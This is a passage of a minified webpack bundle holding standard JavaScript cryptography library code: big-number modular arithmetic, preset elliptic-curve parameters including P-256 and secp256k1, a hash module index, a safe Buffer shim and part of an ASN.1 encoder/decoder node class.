                    (BN.prototype.redIAdd = function (num) {
                        return assert(this.red, "redIAdd works only with red numbers"), this.red.iadd(this, num);
                    }),
                    (BN.prototype.redSub = function (num) {
                        return assert(this.red, "redSub works only with red numbers"), this.red.sub(this, num);
                    }),
                    (BN.prototype.redISub = function (num) {
                        return assert(this.red, "redISub works only with red numbers"), this.red.isub(this, num);
                    }),
                    (BN.prototype.redShl = function (num) {
                        return assert(this.red, "redShl works only with red numbers"), this.red.shl(this, num);
                    }),
                    (BN.prototype.redMul = function (num) {
                        return assert(this.red, "redMul works only with red numbers"), this.red._verify2(this, num), this.red.mul(this, num);
                    }),
                    (BN.prototype.redIMul = function (num) {
                        return assert(this.red, "redMul works only with red numbers"), this.red._verify2(this, num), this.red.imul(this, num);
                    }),
                    (BN.prototype.redSqr = function () {
                        return assert(this.red, "redSqr works only with red numbers"), this.red._verify1(this), this.red.sqr(this);
                    }),
                    (BN.prototype.redISqr = function () {
                        return assert(this.red, "redISqr works only with red numbers"), this.red._verify1(this), this.red.isqr(this);
                    }),
                    (BN.prototype.redSqrt = function () {
                        return assert(this.red, "redSqrt works only with red numbers"), this.red._verify1(this), this.red.sqrt(this);
                    }),
                    (BN.prototype.redInvm = function () {
                        return assert(this.red, "redInvm works only with red numbers"), this.red._verify1(this), this.red.invm(this);
                    }),
                    (BN.prototype.redNeg = function () {
                        return assert(this.red, "redNeg works only with red numbers"), this.red._verify1(this), this.red.neg(this);
                    }),
                    (BN.prototype.redPow = function (num) {
                        return assert(this.red && !num.red, "redPow(normalNum)"), this.red._verify1(this), this.red.pow(this, num);
                    });
                var primes = { k256: null, p224: null, p192: null, p25519: null };
                function MPrime(name, p) {
                    (this.name = name), (this.p = new BN(p, 16)), (this.n = this.p.bitLength()), (this.k = new BN(1).iushln(this.n).isub(this.p)), (this.tmp = this._tmp());
                }
                function K256() {
                    MPrime.call(this, "k256", "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f");
                }
                function P224() {
                    MPrime.call(this, "p224", "ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001");
                }
                function P192() {
                    MPrime.call(this, "p192", "ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff");
                }
                function P25519() {
                    MPrime.call(this, "25519", "7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed");
                }
                function Red(m) {
                    if ("string" == typeof m) {
                        var prime = BN._prime(m);
                        (this.m = prime.p), (this.prime = prime);
                    } else assert(m.gtn(1), "modulus must be greater than 1"), (this.m = m), (this.prime = null);
                }
                function Mont(m) {
                    Red.call(this, m),
                        (this.shift = this.m.bitLength()),
                        this.shift % 26 != 0 && (this.shift += 26 - (this.shift % 26)),
                        (this.r = new BN(1).iushln(this.shift)),
                        (this.r2 = this.imod(this.r.sqr())),
                        (this.rinv = this.r._invmp(this.m)),
                        (this.minv = this.rinv.mul(this.r).isubn(1).div(this.m)),
                        (this.minv = this.minv.umod(this.r)),
                        (this.minv = this.r.sub(this.minv));
                }
                (MPrime.prototype._tmp = function () {
                    var tmp = new BN(null);
                    return (tmp.words = new Array(Math.ceil(this.n / 13))), tmp;
                }),
                    (MPrime.prototype.ireduce = function (num) {
                        var rlen,
                            r = num;
                        do {
                            this.split(r, this.tmp), (rlen = (r = (r = this.imulK(r)).iadd(this.tmp)).bitLength());
                        } while (rlen > this.n);
                        var cmp = rlen < this.n ? -1 : r.ucmp(this.p);
                        return 0 === cmp ? ((r.words[0] = 0), (r.length = 1)) : cmp > 0 ? r.isub(this.p) : void 0 !== r.strip ? r.strip() : r._strip(), r;
                    }),
                    (MPrime.prototype.split = function (input, out) {
                        input.iushrn(this.n, 0, out);
                    }),
                    (MPrime.prototype.imulK = function (num) {
                        return num.imul(this.k);
                    }),
                    inherits(K256, MPrime),
                    (K256.prototype.split = function (input, output) {
                        for (var outLen = Math.min(input.length, 9), i = 0; i < outLen; i++) output.words[i] = input.words[i];
                        if (((output.length = outLen), input.length <= 9)) return (input.words[0] = 0), void (input.length = 1);
                        var prev = input.words[9];
                        for (output.words[output.length++] = 4194303 & prev, i = 10; i < input.length; i++) {
                            var next = 0 | input.words[i];
                            (input.words[i - 10] = ((4194303 & next) << 4) | (prev >>> 22)), (prev = next);
                        }
                        (prev >>>= 22), (input.words[i - 10] = prev), 0 === prev && input.length > 10 ? (input.length -= 10) : (input.length -= 9);
                    }),
                    (K256.prototype.imulK = function (num) {
                        (num.words[num.length] = 0), (num.words[num.length + 1] = 0), (num.length += 2);
                        for (var lo = 0, i = 0; i < num.length; i++) {
                            var w = 0 | num.words[i];
                            (lo += 977 * w), (num.words[i] = 67108863 & lo), (lo = 64 * w + ((lo / 67108864) | 0));
                        }
                        return 0 === num.words[num.length - 1] && (num.length--, 0 === num.words[num.length - 1] && num.length--), num;
                    }),
                    inherits(P224, MPrime),
                    inherits(P192, MPrime),
                    inherits(P25519, MPrime),
                    (P25519.prototype.imulK = function (num) {
                        for (var carry = 0, i = 0; i < num.length; i++) {
                            var hi = 19 * (0 | num.words[i]) + carry,
                                lo = 67108863 & hi;
                            (hi >>>= 26), (num.words[i] = lo), (carry = hi);
                        }
                        return 0 !== carry && (num.words[num.length++] = carry), num;
                    }),
                    (BN._prime = function (name) {
                        if (primes[name]) return primes[name];
                        var prime;
                        if ("k256" === name) prime = new K256();
                        else if ("p224" === name) prime = new P224();
                        else if ("p192" === name) prime = new P192();
                        else {
                            if ("p25519" !== name) throw new Error("Unknown prime " + name);
                            prime = new P25519();
                        }
                        return (primes[name] = prime), prime;
                    }),
                    (Red.prototype._verify1 = function (a) {
                        assert(0 === a.negative, "red works only with positives"), assert(a.red, "red works only with red numbers");
                    }),
                    (Red.prototype._verify2 = function (a, b) {
                        assert(0 == (a.negative | b.negative), "red works only with positives"), assert(a.red && a.red === b.red, "red works only with red numbers");
                    }),
                    (Red.prototype.imod = function (a) {
                        return this.prime ? this.prime.ireduce(a)._forceRed(this) : (move(a, a.umod(this.m)._forceRed(this)), a);
                    }),
                    (Red.prototype.neg = function (a) {
                        return a.isZero() ? a.clone() : this.m.sub(a)._forceRed(this);
                    }),
                    (Red.prototype.add = function (a, b) {
                        this._verify2(a, b);
                        var res = a.add(b);
                        return res.cmp(this.m) >= 0 && res.isub(this.m), res._forceRed(this);
                    }),
                    (Red.prototype.iadd = function (a, b) {
                        this._verify2(a, b);
                        var res = a.iadd(b);
                        return res.cmp(this.m) >= 0 && res.isub(this.m), res;
                    }),
                    (Red.prototype.sub = function (a, b) {
                        this._verify2(a, b);
                        var res = a.sub(b);
                        return res.cmpn(0) < 0 && res.iadd(this.m), res._forceRed(this);
                    }),
                    (Red.prototype.isub = function (a, b) {
                        this._verify2(a, b);
                        var res = a.isub(b);
                        return res.cmpn(0) < 0 && res.iadd(this.m), res;
                    }),
                    (Red.prototype.shl = function (a, num) {
                        return this._verify1(a), this.imod(a.ushln(num));
                    }),
                    (Red.prototype.imul = function (a, b) {
                        return this._verify2(a, b), this.imod(a.imul(b));
                    }),
                    (Red.prototype.mul = function (a, b) {
                        return this._verify2(a, b), this.imod(a.mul(b));
                    }),
                    (Red.prototype.isqr = function (a) {
                        return this.imul(a, a.clone());
                    }),
                    (Red.prototype.sqr = function (a) {
                        return this.mul(a, a);
                    }),
                    (Red.prototype.sqrt = function (a) {
                        if (a.isZero()) return a.clone();
                        var mod3 = this.m.andln(3);
                        if ((assert(mod3 % 2 == 1), 3 === mod3)) {
                            var pow = this.m.add(new BN(1)).iushrn(2);
                            return this.pow(a, pow);
                        }
                        for (var q = this.m.subn(1), s = 0; !q.isZero() && 0 === q.andln(1); ) s++, q.iushrn(1);
                        assert(!q.isZero());
                        var one = new BN(1).toRed(this),
                            nOne = one.redNeg(),
                            lpow = this.m.subn(1).iushrn(1),
                            z = this.m.bitLength();
                        for (z = new BN(2 * z * z).toRed(this); 0 !== this.pow(z, lpow).cmp(nOne); ) z.redIAdd(nOne);
                        for (var c = this.pow(z, q), r = this.pow(a, q.addn(1).iushrn(1)), t = this.pow(a, q), m = s; 0 !== t.cmp(one); ) {
                            for (var tmp = t, i = 0; 0 !== tmp.cmp(one); i++) tmp = tmp.redSqr();
                            assert(i < m);
                            var b = this.pow(c, new BN(1).iushln(m - i - 1));
                            (r = r.redMul(b)), (c = b.redSqr()), (t = t.redMul(c)), (m = i);
                        }
                        return r;
                    }),
                    (Red.prototype.invm = function (a) {
                        var inv = a._invmp(this.m);
                        return 0 !== inv.negative ? ((inv.negative = 0), this.imod(inv).redNeg()) : this.imod(inv);
                    }),
                    (Red.prototype.pow = function (a, num) {
                        if (num.isZero()) return new BN(1).toRed(this);
                        if (0 === num.cmpn(1)) return a.clone();
                        var wnd = new Array(16);
                        (wnd[0] = new BN(1).toRed(this)), (wnd[1] = a);
                        for (var i = 2; i < wnd.length; i++) wnd[i] = this.mul(wnd[i - 1], a);
                        var res = wnd[0],
                            current = 0,
                            currentLen = 0,
                            start = num.bitLength() % 26;
                        for (0 === start && (start = 26), i = num.length - 1; i >= 0; i--) {
                            for (var word = num.words[i], j = start - 1; j >= 0; j--) {
                                var bit = (word >> j) & 1;
                                res !== wnd[0] && (res = this.sqr(res)),
                                    0 !== bit || 0 !== current ? ((current <<= 1), (current |= bit), (4 === ++currentLen || (0 === i && 0 === j)) && ((res = this.mul(res, wnd[current])), (currentLen = 0), (current = 0))) : (currentLen = 0);
                            }
                            start = 26;
                        }
                        return res;
                    }),
                    (Red.prototype.convertTo = function (num) {
                        var r = num.umod(this.m);
                        return r === num ? r.clone() : r;
                    }),
                    (Red.prototype.convertFrom = function (num) {
                        var res = num.clone();
                        return (res.red = null), res;
                    }),
                    (BN.mont = function (num) {
                        return new Mont(num);
                    }),
                    inherits(Mont, Red),
                    (Mont.prototype.convertTo = function (num) {
                        return this.imod(num.ushln(this.shift));
                    }),
                    (Mont.prototype.convertFrom = function (num) {
                        var r = this.imod(num.mul(this.rinv));
                        return (r.red = null), r;
                    }),
                    (Mont.prototype.imul = function (a, b) {
                        if (a.isZero() || b.isZero()) return (a.words[0] = 0), (a.length = 1), a;
                        var t = a.imul(b),
                            c = t.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),
                            u = t.isub(c).iushrn(this.shift),
                            res = u;
                        return u.cmp(this.m) >= 0 ? (res = u.isub(this.m)) : u.cmpn(0) < 0 && (res = u.iadd(this.m)), res._forceRed(this);
                    }),
                    (Mont.prototype.mul = function (a, b) {
                        if (a.isZero() || b.isZero()) return new BN(0)._forceRed(this);
                        var t = a.mul(b),
                            c = t.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),
                            u = t.isub(c).iushrn(this.shift),
                            res = u;
                        return u.cmp(this.m) >= 0 ? (res = u.isub(this.m)) : u.cmpn(0) < 0 && (res = u.iadd(this.m)), res._forceRed(this);
                    }),
                    (Mont.prototype.invm = function (a) {
                        return this.imod(a._invmp(this.m).mul(this.r2))._forceRed(this);
                    });
            })(module, this);
        }.call(this, __webpack_require__(23)(module)));
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var elliptic = exports;
        (elliptic.version = __webpack_require__(251).version),
            (elliptic.utils = __webpack_require__(12)),
            (elliptic.rand = __webpack_require__(54)),
            (elliptic.curve = __webpack_require__(120)),
            (elliptic.curves = __webpack_require__(60)),
            (elliptic.ec = __webpack_require__(263)),
            (elliptic.eddsa = __webpack_require__(267));
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var pre,
            curves = exports,
            hash = __webpack_require__(61),
            curve = __webpack_require__(120),
            assert = __webpack_require__(12).assert;
        function PresetCurve(options) {
            "short" === options.type ? (this.curve = new curve.short(options)) : "edwards" === options.type ? (this.curve = new curve.edwards(options)) : (this.curve = new curve.mont(options)),
                (this.g = this.curve.g),
                (this.n = this.curve.n),
                (this.hash = options.hash),
                assert(this.g.validate(), "Invalid curve"),
                assert(this.g.mul(this.n).isInfinity(), "Invalid curve, G*N != O");
        }
        function defineCurve(name, options) {
            Object.defineProperty(curves, name, {
                configurable: !0,
                enumerable: !0,
                get: function () {
                    var curve = new PresetCurve(options);
                    return Object.defineProperty(curves, name, { configurable: !0, enumerable: !0, value: curve }), curve;
                },
            });
        }
        (curves.PresetCurve = PresetCurve),
            defineCurve("p192", {
                type: "short",
                prime: "p192",
                p: "ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff",
                a: "ffffffff ffffffff ffffffff fffffffe ffffffff fffffffc",
                b: "64210519 e59c80e7 0fa7e9ab 72243049 feb8deec c146b9b1",
                n: "ffffffff ffffffff ffffffff 99def836 146bc9b1 b4d22831",
                hash: hash.sha256,
                gRed: !1,
                g: ["188da80e b03090f6 7cbf20eb 43a18800 f4ff0afd 82ff1012", "07192b95 ffc8da78 631011ed 6b24cdd5 73f977a1 1e794811"],
            }),
            defineCurve("p224", {
                type: "short",
                prime: "p224",
                p: "ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001",
                a: "ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff fffffffe",
                b: "b4050a85 0c04b3ab f5413256 5044b0b7 d7bfd8ba 270b3943 2355ffb4",
                n: "ffffffff ffffffff ffffffff ffff16a2 e0b8f03e 13dd2945 5c5c2a3d",
                hash: hash.sha256,
                gRed: !1,
                g: ["b70e0cbd 6bb4bf7f 321390b9 4a03c1d3 56c21122 343280d6 115c1d21", "bd376388 b5f723fb 4c22dfe6 cd4375a0 5a074764 44d58199 85007e34"],
            }),
            defineCurve("p256", {
                type: "short",
                prime: null,
                p: "ffffffff 00000001 00000000 00000000 00000000 ffffffff ffffffff ffffffff",
                a: "ffffffff 00000001 00000000 00000000 00000000 ffffffff ffffffff fffffffc",
                b: "5ac635d8 aa3a93e7 b3ebbd55 769886bc 651d06b0 cc53b0f6 3bce3c3e 27d2604b",
                n: "ffffffff 00000000 ffffffff ffffffff bce6faad a7179e84 f3b9cac2 fc632551",
                hash: hash.sha256,
                gRed: !1,
                g: ["6b17d1f2 e12c4247 f8bce6e5 63a440f2 77037d81 2deb33a0 f4a13945 d898c296", "4fe342e2 fe1a7f9b 8ee7eb4a 7c0f9e16 2bce3357 6b315ece cbb64068 37bf51f5"],
            }),
            defineCurve("p384", {
                type: "short",
                prime: null,
                p: "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe ffffffff 00000000 00000000 ffffffff",
                a: "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe ffffffff 00000000 00000000 fffffffc",
                b: "b3312fa7 e23ee7e4 988e056b e3f82d19 181d9c6e fe814112 0314088f 5013875a c656398d 8a2ed19d 2a85c8ed d3ec2aef",
                n: "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff c7634d81 f4372ddf 581a0db2 48b0a77a ecec196a ccc52973",
                hash: hash.sha384,
                gRed: !1,
                g: [
                    "aa87ca22 be8b0537 8eb1c71e f320ad74 6e1d3b62 8ba79b98 59f741e0 82542a38 5502f25d bf55296c 3a545e38 72760ab7",
                    "3617de4a 96262c6f 5d9e98bf 9292dc29 f8f41dbd 289a147c e9da3113 b5f0b8c0 0a60b1ce 1d7e819d 7a431d7c 90ea0e5f",
                ],
            }),
            defineCurve("p521", {
                type: "short",
                prime: null,
                p: "000001ff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff",
                a: "000001ff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffc",
                b: "00000051 953eb961 8e1c9a1f 929a21a0 b68540ee a2da725b 99b315f3 b8b48991 8ef109e1 56193951 ec7e937b 1652c0bd 3bb1bf07 3573df88 3d2c34f1 ef451fd4 6b503f00",
                n: "000001ff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffa 51868783 bf2f966b 7fcc0148 f709a5d0 3bb5c9b8 899c47ae bb6fb71e 91386409",
                hash: hash.sha512,
                gRed: !1,
                g: [
                    "000000c6 858e06b7 0404e9cd 9e3ecb66 2395b442 9c648139 053fb521 f828af60 6b4d3dba a14b5e77 efe75928 fe1dc127 a2ffa8de 3348b3c1 856a429b f97e7e31 c2e5bd66",
                    "00000118 39296a78 9a3bc004 5c8a5fb4 2c7d1bd9 98f54449 579b4468 17afbd17 273e662c 97ee7299 5ef42640 c550b901 3fad0761 353c7086 a272c240 88be9476 9fd16650",
                ],
            }),
            defineCurve("curve25519", {
                type: "mont",
                prime: "p25519",
                p: "7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed",
                a: "76d06",
                b: "1",
                n: "1000000000000000 0000000000000000 14def9dea2f79cd6 5812631a5cf5d3ed",
                hash: hash.sha256,
                gRed: !1,
                g: ["9"],
            }),
            defineCurve("ed25519", {
                type: "edwards",
                prime: "p25519",
                p: "7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed",
                a: "-1",
                c: "1",
                d: "52036cee2b6ffe73 8cc740797779e898 00700a4d4141d8ab 75eb4dca135978a3",
                n: "1000000000000000 0000000000000000 14def9dea2f79cd6 5812631a5cf5d3ed",
                hash: hash.sha256,
                gRed: !1,
                g: ["216936d3cd6e53fec0a4e231fdd6dc5c692cc7609525a7b2c9562d608f25d51a", "6666666666666666666666666666666666666666666666666666666666666658"],
            });
        try {
            pre = __webpack_require__(262);
        } catch (e) {
            pre = void 0;
        }
        defineCurve("secp256k1", {
            type: "short",
            prime: "k256",
            p: "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f",
            a: "0",
            b: "7",
            n: "ffffffff ffffffff ffffffff fffffffe baaedce6 af48a03b bfd25e8c d0364141",
            h: "1",
            hash: hash.sha256,
            beta: "7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee",
            lambda: "5363ad4cc05c30e0a5261c028812645a122e22ea20816678df02967c1b23bd72",
            basis: [
                { a: "3086d221a7d46bcde86c90e49284eb15", b: "-e4437ed6010e88286f547fa90abfe4c3" },
                { a: "114ca50f7a8e2f3f657c1108d9d44cfd8", b: "3086d221a7d46bcde86c90e49284eb15" },
            ],
            gRed: !1,
            g: ["79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798", "483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8", pre],
        });
    },
    function (module, exports, __webpack_require__) {
        var hash = exports;
        (hash.utils = __webpack_require__(13)),
            (hash.common = __webpack_require__(36)),
            (hash.sha = __webpack_require__(256)),
            (hash.ripemd = __webpack_require__(260)),
            (hash.hmac = __webpack_require__(261)),
            (hash.sha1 = hash.sha.sha1),
            (hash.sha256 = hash.sha.sha256),
            (hash.sha224 = hash.sha.sha224),
            (hash.sha384 = hash.sha.sha384),
            (hash.sha512 = hash.sha.sha512),
            (hash.ripemd160 = hash.ripemd.ripemd160);
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        (function (process) {
            var key,
                buffer = __webpack_require__(6),
                Buffer = buffer.Buffer,
                safer = {};
            for (key in buffer) buffer.hasOwnProperty(key) && "SlowBuffer" !== key && "Buffer" !== key && (safer[key] = buffer[key]);
            var Safer = (safer.Buffer = {});
            for (key in Buffer) Buffer.hasOwnProperty(key) && "allocUnsafe" !== key && "allocUnsafeSlow" !== key && (Safer[key] = Buffer[key]);
            if (
                ((safer.Buffer.prototype = Buffer.prototype),
                (Safer.from && Safer.from !== Uint8Array.from) ||
                    (Safer.from = function (value, encodingOrOffset, length) {
                        if ("number" == typeof value) throw new TypeError('The "value" argument must not be of type number. Received type ' + typeof value);
                        if (value && void 0 === value.length) throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + typeof value);
                        return Buffer(value, encodingOrOffset, length);
                    }),
                Safer.alloc ||
                    (Safer.alloc = function (size, fill, encoding) {
                        if ("number" != typeof size) throw new TypeError('The "size" argument must be of type number. Received type ' + typeof size);
                        if (size < 0 || size >= 2 * (1 << 30)) throw new RangeError('The value "' + size + '" is invalid for option "size"');
                        var buf = Buffer(size);
                        return fill && 0 !== fill.length ? ("string" == typeof encoding ? buf.fill(fill, encoding) : buf.fill(fill)) : buf.fill(0), buf;
                    }),
                !safer.kStringMaxLength)
            )
                try {
                    safer.kStringMaxLength = process.binding("buffer").kStringMaxLength;
                } catch (e) {}
            safer.constants || ((safer.constants = { MAX_LENGTH: safer.kMaxLength }), safer.kStringMaxLength && (safer.constants.MAX_STRING_LENGTH = safer.kStringMaxLength)), (module.exports = safer);
        }.call(this, __webpack_require__(7)));
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        const Reporter = __webpack_require__(64).Reporter,
            EncoderBuffer = __webpack_require__(37).EncoderBuffer,
            DecoderBuffer = __webpack_require__(37).DecoderBuffer,
            assert = __webpack_require__(11),
            tags = [
                "seq",
                "seqof",
                "set",
                "setof",
                "objid",
                "bool",
                "gentime",
                "utctime",
                "null_",
                "enum",
                "int",
                "objDesc",
                "bitstr",
                "bmpstr",
                "charstr",
                "genstr",
                "graphstr",
                "ia5str",
                "iso646str",
                "numstr",
                "octstr",
                "printstr",
                "t61str",
                "unistr",
                "utf8str",
                "videostr",
            ],
            methods = ["key", "obj", "use", "optional", "explicit", "implicit", "def", "choice", "any", "contains"].concat(tags);
        function Node(enc, parent, name) {
            const state = {};
            (this._baseState = state),
                (state.name = name),
                (state.enc = enc),
                (state.parent = parent || null),
                (state.children = null),
                (state.tag = null),
                (state.args = null),
                (state.reverseArgs = null),
                (state.choice = null),
                (state.optional = !1),
                (state.any = !1),
                (state.obj = !1),
                (state.use = null),
                (state.useDecoder = null),
                (state.key = null),
                (state.default = null),
                (state.explicit = null),
                (state.implicit = null),
                (state.contains = null),
                state.parent || ((state.children = []), this._wrap());
        }
        module.exports = Node;
        const stateProps = ["enc", "parent", "children", "tag", "args", "reverseArgs", "choice", "optional", "any", "obj", "use", "alteredUse", "key", "default", "explicit", "implicit", "contains"];
        (Node.prototype.clone = function () {
            const state = this._baseState,
                cstate = {};
            stateProps.forEach(function (prop) {
                cstate[prop] = state[prop];
            });
            const res = new this.constructor(cstate.parent);
            return (res._baseState = cstate), res;
        }),
            (Node.prototype._wrap = function () {
                const state = this._baseState;
                methods.forEach(function (method) {
                    this[method] = function () {
                        const clone = new this.constructor(this);
                        return state.children.push(clone), clone[method].apply(clone, arguments);
                    };
                }, this);
            }),
            (Node.prototype._init = function (body) {
                const state = this._baseState;
                assert(null === state.parent),
                    body.call(this),
                    (state.children = state.children.filter(function (child) {
                        return child._baseState.parent === this;
                    }, this)),
                    assert.equal(state.children.length, 1, "Root node can have only one child");
            }),
            (Node.prototype._useArgs = function (args) {
                const state = this._baseState,
                    children = args.filter(function (arg) {
                        return arg instanceof this.constructor;
                    }, this);
                (args = args.filter(function (arg) {
                    return !(arg instanceof this.constructor);
                }, this)),
                    0 !== children.length &&
                        (assert(null === state.children),
                        (state.children = children),
                        children.forEach(function (child) {
                            child._baseState.parent = this;
                        }, this)),
                    0 !== args.length &&
                        (assert(null === state.args),
                        (state.args = args),
                        (state.reverseArgs = args.map(function (arg) {
                            if ("object" != typeof arg || arg.constructor !== Object) return arg;
                            const res = {};
                            return (
                                Object.keys(arg).forEach(function (key) {
                                    key == (0 | key) && (key |= 0);
                                    const value = arg[key];
                                    res[value] = key;
                                }),
                                res
                            );
                        })));
            }),
            [
                "_peekTag",
                "_decodeTag",
                "_use",
                "_decodeStr",
                "_decodeObjid",
                "_decodeTime",
                "_decodeNull",
                "_decodeInt",
                "_decodeBool",
                "_decodeList",
                "_encodeComposite",
                "_encodeStr",
                "_encodeObjid",
                "_encodeTime",
                "_encodeNull",
                "_encodeInt",
                "_encodeBool",
            ].forEach(function (method) {
                Node.prototype[method] = function () {
                    const state = this._baseState;
                    throw new Error(method + " not implemented for encoding: " + state.enc);
                };
            }),
            tags.forEach(function (tag) {
                Node.prototype[tag] = function () {
                    const state = this._baseState,
                        args = Array.prototype.slice.call(arguments);
                    return assert(null === state.tag), (state.tag = tag), this._useArgs(args), this;
                };
            }),
            (Node.prototype.use = function (item) {
                assert(item);
                const state = this._baseState;
                return assert(null === state.use), (state.use = item), this;
            }),
            (Node.prototype.optional = function () {
                return (this._baseState.optional = !0), this;
            }),
            (Node.prototype.def = function (val) {
                const state = this._baseState;
                return assert(null === state.default), (state.default = val), (state.optional = !0), this;
            }),
            (Node.prototype.explicit = function (num) {
                const state = this._baseState;
                return assert(null === state.explicit && null === state.implicit), (state.explicit = num), this;
            }),
            (Node.prototype.implicit = function (num) {
                const state = this._baseState;
                return assert(null === state.explicit && null === state.implicit), (state.implicit = num), this;
            }),
            (Node.prototype.obj = function () {
                const state = this._baseState,
                    args = Array.prototype.slice.call(arguments);
                return (state.obj = !0), 0 !== args.length && this._useArgs(args), this;
            }),
            (Node.prototype.key = function (newKey) {
                const state = this._baseState;
                return assert(null === state.key), (state.key = newKey), this;
            }),
            (Node.prototype.any = function () {
                return (this._baseState.any = !0), this;
            }),
            (Node.prototype.choice = function (obj) {
                const state = this._baseState;
                return (
                    assert(null === state.choice),
                    (state.choice = obj),
                    this._useArgs(
                        Object.keys(obj).map(function (key) {
                            return obj[key];
                        })
                    ),
                    this
                );
            }),
            (Node.prototype.contains = function (item) {
                const state = this._baseState;
                return assert(null === state.use), (state.contains = item), this;
            }),
            (Node.prototype._decode = function (input, options) {
                const state = this._baseState;
                if (null === state.parent) return input.wrapResult(state.children[0]._decode(input, options));
                let prevObj,
                    result = state.default,
                    present = !0,
                    prevKey = null;
                if ((null !== state.key && (prevKey = input.enterKey(state.key)), state.optional)) {
                    let tag = null;
                    if ((null !== state.explicit ? (tag = state.explicit) : null !== state.implicit ? (tag = state.implicit) : null !== state.tag && (tag = state.tag), null !== tag || state.any)) {
                        if (((present = this._peekTag(input, tag, state.any)), input.isError(present))) return present;
                    } else {
                        const save = input.save();
                        try {
                            null === state.choice ? this._decodeGeneric(state.tag, input, options) : this._decodeChoice(input, options), (present = !0);
                        } catch (e) {
                            present = !1;
                        }
                        input.restore(save);
                    }
                }
                if ((state.obj && present && (prevObj = input.enterObject()), present)) {
                    if (null !== state.explicit) {
                        const explicit = this._decodeTag(input, state.explicit);
                        if (input.isError(explicit)) return explicit;
                        input = explicit;
                    }
                    const start = input.offset;
                    if (null === state.use && null === state.choice) {
                        let save;
                        state.any && (save = input.save());
                        const body = this._decodeTag(input, null !== state.implicit ? state.implicit : state.tag, state.any);
                        if (input.isError(body)) return body;
                        state.any ? (result = input.raw(save)) : (input = body);
                    }
                    if (
                        (options && options.track && null !== state.tag && options.track(input.path(), start, input.length, "tagged"),
                        options && options.track && null !== state.tag && options.track(input.path(), input.offset, input.length, "content"),
                        state.any || (result = null === state.choice ? this._decodeGeneric(state.tag, input, options) : this._decodeChoice(input, options)),
                        input.isError(result))
                    )
                        return result;
                    if (
                        (state.any ||
                            null !== state.choice ||
                            null === state.children ||
                            state.children.forEach(function (child) {
                                child._decode(input, options);
                            }),
                        state.contains && ("octstr" === state.tag || "bitstr" === state.tag))
                    ) {
                        const data = new DecoderBuffer(result);
                        result = this._getUse(state.contains, input._reporterState.obj)._decode(data, options);
                    }
                }
                return (
                    state.obj && present && (result = input.leaveObject(prevObj)), null === state.key || (null === result && !0 !== present) ? null !== prevKey && input.exitKey(prevKey) : input.leaveKey(prevKey, state.key, result), result
                );
            }),
            (Node.prototype._decodeGeneric = function (tag, input, options) {
                const state = this._baseState;
                return "seq" === tag || "set" === tag
                    ? null
                    : "seqof" === tag || "setof" === tag
                    ? this._decodeList(input, tag, state.args[0], options)
                    : /str$/.test(tag)
                    ? this._decodeStr(input, tag, options)
                    : "objid" === tag && state.args
                    ? this._decodeObjid(input, state.args[0], state.args[1], options)
                    : "objid" === tag
                    ? this._decodeObjid(input, null, null, options)
                    : "gentime" === tag || "utctime" === tag
                    ? this._decodeTime(input, tag, options)
                    : "null_" === tag
                    ? this._decodeNull(input, options)
                    : "bool" === tag
                    ? this._decodeBool(input, options)
                    : "objDesc" === tag
                    ? this._decodeStr(input, tag, options)
                    : "int" === tag || "enum" === tag
                    ? this._decodeInt(input, state.args && state.args[0], options)
                    : null !== state.use
                    ? this._getUse(state.use, input._reporterState.obj)._decode(input, options)
                    : input.error("unknown tag: " + tag);
            }),
            (Node.prototype._getUse = function (entity, obj) {
                const state = this._baseState;
                return (
                    (state.useDecoder = this._use(entity, obj)),
                    assert(null === state.useDecoder._baseState.parent),
                    (state.useDecoder = state.useDecoder._baseState.children[0]),
                    state.implicit !== state.useDecoder._baseState.implicit && ((state.useDecoder = state.useDecoder.clone()), (state.useDecoder._baseState.implicit = state.implicit)),
                    state.useDecoder
                );
            }),
            (Node.prototype._decodeChoice = function (input, options) {
                const state = this._baseState;
                let result = null,
                    match = !1;
                return (
                    Object.keys(state.choice).some(function (key) {
                        const save = input.save(),
                            node = state.choice[key];
                        try {
                            const value = node._decode(input, options);
                            if (input.isError(value)) return !1;
                            (result = { type: key, value: value }), (match = !0);
                        } catch (e) {
                            return input.restore(save), !1;
                        }
                        return !0;
                    }, this),
                    match ? result : input.error("Choice not matched")
                );
            }),
            (Node.prototype._createEncoderBuffer = function (data) {
                return new EncoderBuffer(data, this.reporter);
            }),
            (Node.prototype._encode = function (data, reporter, parent) {
                const state = this._baseState;
                if (null !== state.default && state.default === data) return;
                const result = this._encodeValue(data, reporter, parent);
                return void 0 === result || this._skipDefault(result, reporter, parent) ? void 0 : result;
            }),
            (Node.prototype._encodeValue = function (data, reporter, parent) {
                const state = this._baseState;
                if (null === state.parent) return state.children[0]._encode(data, reporter || new Reporter());
                let result = null;
